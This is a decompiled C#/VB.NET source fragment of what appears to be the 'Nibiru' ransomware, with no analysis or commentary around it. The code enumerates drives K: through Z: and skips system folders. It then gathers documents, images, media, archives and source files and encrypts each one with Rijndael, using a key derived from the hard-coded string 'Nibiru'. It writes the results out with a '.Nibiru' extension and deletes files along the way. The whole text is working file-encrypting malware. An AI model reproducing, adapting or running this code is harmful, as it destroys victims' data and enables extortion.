				if (!directory10.EndsWith("Bin") && !directory10.EndsWith("indows") && !directory10.EndsWith("tings") && !directory10.EndsWith("System Volume Information") && !directory10.EndsWith("cache") && !directory10.EndsWith("very") && !directory10.EndsWith("rogram Files (x86)") && !directory10.EndsWith("rogram Files") && !directory10.EndsWith("boot") && !directory10.EndsWith("efi") && !directory10.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory10);
					ListBox9.get_Items().Add((object)directory10);
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("K:\\"))
			{
				if (!directory11.EndsWith("Bin") && !directory11.EndsWith("indows") && !directory11.EndsWith("tings") && !directory11.EndsWith("System Volume Information") && !directory11.EndsWith("cache") && !directory11.EndsWith("very") && !directory11.EndsWith("rogram Files (x86)") && !directory11.EndsWith("rogram Files") && !directory11.EndsWith("boot") && !directory11.EndsWith("efi") && !directory11.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory11);
					ListBox9.get_Items().Add((object)directory11);
				}
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("L:\\"))
			{
				if (!directory12.EndsWith("Bin") && !directory12.EndsWith("indows") && !directory12.EndsWith("tings") && !directory12.EndsWith("System Volume Information") && !directory12.EndsWith("cache") && !directory12.EndsWith("very") && !directory12.EndsWith("rogram Files (x86)") && !directory12.EndsWith("rogram Files") && !directory12.EndsWith("boot") && !directory12.EndsWith("efi") && !directory12.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory12);
					ListBox9.get_Items().Add((object)directory12);
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("M:\\"))
			{
				if (!directory13.EndsWith("Bin") && !directory13.EndsWith("indows") && !directory13.EndsWith("tings") && !directory13.EndsWith("System Volume Information") && !directory13.EndsWith("cache") && !directory13.EndsWith("very") && !directory13.EndsWith("rogram Files (x86)") && !directory13.EndsWith("rogram Files") && !directory13.EndsWith("boot") && !directory13.EndsWith("efi") && !directory13.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory13);
					ListBox9.get_Items().Add((object)directory13);
				}
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory14 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("N:\\"))
			{
				if (!directory14.EndsWith("Bin") && !directory14.EndsWith("indows") && !directory14.EndsWith("tings") && !directory14.EndsWith("System Volume Information") && !directory14.EndsWith("cache") && !directory14.EndsWith("very") && !directory14.EndsWith("rogram Files (x86)") && !directory14.EndsWith("rogram Files") && !directory14.EndsWith("boot") && !directory14.EndsWith("efi") && !directory14.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory14);
					ListBox9.get_Items().Add((object)directory14);
				}
			}
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory15 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("O:\\"))
			{
				if (!directory15.EndsWith("Bin") && !directory15.EndsWith("indows") && !directory15.EndsWith("tings") && !directory15.EndsWith("System Volume Information") && !directory15.EndsWith("cache") && !directory15.EndsWith("very") && !directory15.EndsWith("rogram Files (x86)") && !directory15.EndsWith("rogram Files") && !directory15.EndsWith("boot") && !directory15.EndsWith("efi") && !directory15.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory15);
					ListBox9.get_Items().Add((object)directory15);
				}
			}
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory16 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("P:\\"))
			{
				if (!directory16.EndsWith("Bin") && !directory16.EndsWith("indows") && !directory16.EndsWith("tings") && !directory16.EndsWith("System Volume Information") && !directory16.EndsWith("cache") && !directory16.EndsWith("very") && !directory16.EndsWith("rogram Files (x86)") && !directory16.EndsWith("rogram Files") && !directory16.EndsWith("boot") && !directory16.EndsWith("efi") && !directory16.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory16);
					ListBox9.get_Items().Add((object)directory16);
				}
			}
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory17 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Q:\\"))
			{
				if (!directory17.EndsWith("Bin") && !directory17.EndsWith("indows") && !directory17.EndsWith("tings") && !directory17.EndsWith("System Volume Information") && !directory17.EndsWith("cache") && !directory17.EndsWith("very") && !directory17.EndsWith("rogram Files (x86)") && !directory17.EndsWith("rogram Files") && !directory17.EndsWith("boot") && !directory17.EndsWith("efi") && !directory17.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory17);
					ListBox9.get_Items().Add((object)directory17);
				}
			}
		}
		catch (Exception projectError17)
		{
			ProjectData.SetProjectError(projectError17);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory18 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("R:\\"))
			{
				if (!directory18.EndsWith("Bin") && !directory18.EndsWith("indows") && !directory18.EndsWith("tings") && !directory18.EndsWith("System Volume Information") && !directory18.EndsWith("cache") && !directory18.EndsWith("very") && !directory18.EndsWith("rogram Files (x86)") && !directory18.EndsWith("rogram Files") && !directory18.EndsWith("boot") && !directory18.EndsWith("efi") && !directory18.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory18);
					ListBox9.get_Items().Add((object)directory18);
				}
			}
		}
		catch (Exception projectError18)
		{
			ProjectData.SetProjectError(projectError18);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory19 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("S:\\"))
			{
				if (!directory19.EndsWith("Bin") && !directory19.EndsWith("indows") && !directory19.EndsWith("tings") && !directory19.EndsWith("System Volume Information") && !directory19.EndsWith("cache") && !directory19.EndsWith("very") && !directory19.EndsWith("rogram Files (x86)") && !directory19.EndsWith("rogram Files") && !directory19.EndsWith("boot") && !directory19.EndsWith("efi") && !directory19.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory19);
					ListBox9.get_Items().Add((object)directory19);
				}
			}
		}
		catch (Exception projectError19)
		{
			ProjectData.SetProjectError(projectError19);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory20 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("T:\\"))
			{
				if (!directory20.EndsWith("Bin") && !directory20.EndsWith("indows") && !directory20.EndsWith("tings") && !directory20.EndsWith("System Volume Information") && !directory20.EndsWith("cache") && !directory20.EndsWith("very") && !directory20.EndsWith("rogram Files (x86)") && !directory20.EndsWith("rogram Files") && !directory20.EndsWith("boot") && !directory20.EndsWith("efi") && !directory20.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory20);
					ListBox9.get_Items().Add((object)directory20);
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory21 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("U:\\"))
			{
				if (!directory21.EndsWith("Bin") && !directory21.EndsWith("indows") && !directory21.EndsWith("tings") && !directory21.EndsWith("System Volume Information") && !directory21.EndsWith("cache") && !directory21.EndsWith("very") && !directory21.EndsWith("rogram Files (x86)") && !directory21.EndsWith("rogram Files") && !directory21.EndsWith("boot") && !directory21.EndsWith("efi") && !directory21.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory21);
					ListBox9.get_Items().Add((object)directory21);
				}
			}
		}
		catch (Exception projectError21)
		{
			ProjectData.SetProjectError(projectError21);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory22 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("V:\\"))
			{
				if (!directory22.EndsWith("Bin") && !directory22.EndsWith("indows") && !directory22.EndsWith("tings") && !directory22.EndsWith("System Volume Information") && !directory22.EndsWith("cache") && !directory22.EndsWith("very") && !directory22.EndsWith("rogram Files (x86)") && !directory22.EndsWith("rogram Files") && !directory22.EndsWith("boot") && !directory22.EndsWith("efi") && !directory22.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory22);
					ListBox9.get_Items().Add((object)directory22);
				}
			}
		}
		catch (Exception projectError22)
		{
			ProjectData.SetProjectError(projectError22);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory23 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("W:\\"))
			{
				if (!directory23.EndsWith("Bin") && !directory23.EndsWith("indows") && !directory23.EndsWith("tings") && !directory23.EndsWith("System Volume Information") && !directory23.EndsWith("cache") && !directory23.EndsWith("very") && !directory23.EndsWith("rogram Files (x86)") && !directory23.EndsWith("rogram Files") && !directory23.EndsWith("boot") && !directory23.EndsWith("efi") && !directory23.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory23);
					ListBox9.get_Items().Add((object)directory23);
				}
			}
		}
		catch (Exception projectError23)
		{
			ProjectData.SetProjectError(projectError23);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory24 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("X:\\"))
			{
				if (!directory24.EndsWith("Bin") && !directory24.EndsWith("indows") && !directory24.EndsWith("tings") && !directory24.EndsWith("System Volume Information") && !directory24.EndsWith("cache") && !directory24.EndsWith("very") && !directory24.EndsWith("rogram Files (x86)") && !directory24.EndsWith("rogram Files") && !directory24.EndsWith("boot") && !directory24.EndsWith("efi") && !directory24.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory24);
					ListBox9.get_Items().Add((object)directory24);
				}
			}
		}
		catch (Exception projectError24)
		{
			ProjectData.SetProjectError(projectError24);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory25 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Y:\\"))
			{
				if (!directory25.EndsWith("Bin") && !directory25.EndsWith("indows") && !directory25.EndsWith("tings") && !directory25.EndsWith("System Volume Information") && !directory25.EndsWith("cache") && !directory25.EndsWith("very") && !directory25.EndsWith("rogram Files (x86)") && !directory25.EndsWith("rogram Files") && !directory25.EndsWith("boot") && !directory25.EndsWith("efi") && !directory25.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory25);
					ListBox9.get_Items().Add((object)directory25);
				}
			}
		}
		catch (Exception projectError25)
		{
			ProjectData.SetProjectError(projectError25);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory26 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Z:\\"))
			{
				if (!directory26.EndsWith("Bin") && !directory26.EndsWith("indows") && !directory26.EndsWith("tings") && !directory26.EndsWith("System Volume Information") && !directory26.EndsWith("cache") && !directory26.EndsWith("very") && !directory26.EndsWith("rogram Files (x86)") && !directory26.EndsWith("rogram Files") && !directory26.EndsWith("boot") && !directory26.EndsWith("efi") && !directory26.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory26);
					ListBox9.get_Items().Add((object)directory26);
				}
			}
		}
		catch (Exception projectError26)
		{
			ProjectData.SetProjectError(projectError26);
			ProjectData.ClearProjectError();
		}
		Timer1.Start();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			Timer1.Stop();
			Timer2.Start();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox1.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox2.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar1.Increment(1);
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		ProgressBar2.set_Maximum(ListBox2.get_Items().get_Count());
		if (ProgressBar2.get_Value() == ListBox2.get_Items().get_Count())
		{
			Timer2.Stop();
			Timer3.Start();
			return;
		}
		ListBox2.set_SelectedIndex(ProgressBar2.get_Value());
		ListBox2.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox2.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox3.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar2.Increment(1);
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		ProgressBar3.set_Maximum(ListBox3.get_Items().get_Count());
		if (ProgressBar3.get_Value() == ListBox3.get_Items().get_Count())
		{
			Timer3.Stop();
			Timer4.Start();
			return;
		}
		ListBox3.set_SelectedIndex(ProgressBar3.get_Value());
		ListBox3.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox3.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox4.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar3.Increment(1);
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		ProgressBar4.set_Maximum(ListBox4.get_Items().get_Count());
		if (ProgressBar4.get_Value() == ListBox4.get_Items().get_Count())
		{
			Timer4.Stop();
			Timer5.Start();
			return;
		}
		ListBox4.set_SelectedIndex(ProgressBar4.get_Value());
		ListBox4.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox4.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox5.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar4.Increment(1);
	}

	private void Timer5_Tick(object sender, EventArgs e)
	{
		ProgressBar5.set_Maximum(ListBox5.get_Items().get_Count());
		if (ProgressBar5.get_Value() == ListBox5.get_Items().get_Count())
		{
			Timer5.Stop();
			Timer6.Start();
			return;
		}
		ListBox5.set_SelectedIndex(ProgressBar5.get_Value());
		ListBox5.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox5.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox6.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar5.Increment(1);
	}

	private void Timer6_Tick(object sender, EventArgs e)
	{
		ProgressBar6.set_Maximum(ListBox6.get_Items().get_Count());
		if (ProgressBar6.get_Value() == ListBox6.get_Items().get_Count())
		{
			Timer6.Stop();
			Timer7.Start();
			return;
		}
		ListBox6.set_SelectedIndex(ProgressBar6.get_Value());
		ListBox6.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox6.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox7.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar6.Increment(1);
	}

	private void Timer7_Tick(object sender, EventArgs e)
	{
		ProgressBar7.set_Maximum(ListBox9.get_Items().get_Count());
		if (ProgressBar7.get_Value() == ListBox9.get_Items().get_Count())
		{
			Timer7.Stop();
			Timer8.Start();
			return;
		}
		ListBox9.set_SelectedIndex(ProgressBar7.get_Value());
		ListBox9.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox9.get_SelectedItem());
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(filenamez))
			{
				if (file.EndsWith(".Nibiru"))
				{
					continue;
				}
				if (file.EndsWith(".doc"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".docx"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".xls"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".xlsx"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".ppt"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".pptx"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".jpg"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".jpeg"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".png"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".psd"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".txt"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".zip"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".rar"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".html"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".php"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".asp"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".aspx"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".mp4"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".avi"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".3gp"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".wmv"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".MOV"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".mp3"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".wav"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".flac"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".wma"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".mov"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".raw"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".doc"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".apk"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".encrypt"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith("crypted"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".ahok"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".cs"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				if (file.EndsWith(".vb"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				else if (file.EndsWith(".ppt"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				else if (file.EndsWith(".pptx"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				else if (file.EndsWith(".docx"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				else if (file.EndsWith(".xlsx"))
				{
					ListBox8.get_Items().Add((object)file);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar7.Increment(1);
	}

	private void Timer8_Tick(object sender, EventArgs e)
	{
		ProgressBar9.set_Maximum(ListBox8.get_Items().get_Count());
		if (ProgressBar9.get_Value() == ListBox8.get_Items().get_Count())
		{
			Timer1.Stop();
			((Control)MyProject.Forms.Form2).Show();
			((Control)this).Hide();
			return;
		}
		ListBox8.set_SelectedIndex(ProgressBar9.get_Value());
		ListBox8.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox8.get_SelectedItem());
		try
		{
			byte[] bytKey = CreateKey("Nibiru");
			byte[] bytIV = CreateIV("Nibiru");
			EncryptOrDecryptFile(filenamez, filenamez + ".Nibiru", bytKey, bytIV, CryptoAction.ActionEncrypt);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar9.Increment(1);
	}

	public byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	public byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	public void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_021f: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
				fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
				fsOutput.SetLength(0L);
				byte[] buffer = new byte[4097];
				long num = 0L;
				long length = fsInput.Length;
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				ProgressBar10.set_Value(0);
				ProgressBar10.set_Maximum(100);
				CryptoStream cryptoStream = default(CryptoStream);
				switch (Direction)
				{
				case CryptoAction.ActionEncrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				case CryptoAction.ActionDecrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				}
				while (num < length)
				{
					int num2 = fsInput.Read(buffer, 0, 4096);
					cryptoStream.Write(buffer, 0, num2);
					num += num2;
					ProgressBar10.set_Value((int)Math.Round((double)num / (double)length * 100.0));
				}
				cryptoStream.Close();
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionEncrypt)
				{
					FileInfo fileInfo = new FileInfo(strFileToEncrypt);
					fileInfo.Delete();
				}
				if (Direction == CryptoAction.ActionDecrypt)
				{
					FileInfo fileInfo2 = new FileInfo(strFileToDecrypt);
					fileInfo2.Delete();
				}
				string text = "\r\n";
				if (Direction == CryptoAction.ActionEncrypt)
				{
					Interaction.MsgBox((object)("Encryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
				else
				{
					Interaction.MsgBox((object)("Decryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
			}
			catch (Exception projectError) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				ProjectData.SetProjectError(projectError);
				return Information.Err().get_Number() == 53;
			}).Invoke())
			{
				Interaction.MsgBox((object)"Please check to make sure the path and filenameare correct and if the file exists.", (MsgBoxStyle)48, (object)"Invalid Path or Filename");
				ProjectData.ClearProjectError();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionDecrypt)
				{
					FileInfo fileInfo3 = new FileInfo(filenamez);
					fileInfo3.Delete();
				}
				else
				{
					FileInfo fileInfo4 = new FileInfo(filenamez);
					fileInfo4.Delete();
				}
				ProjectData.ClearProjectError();
			}
		}
	}
}
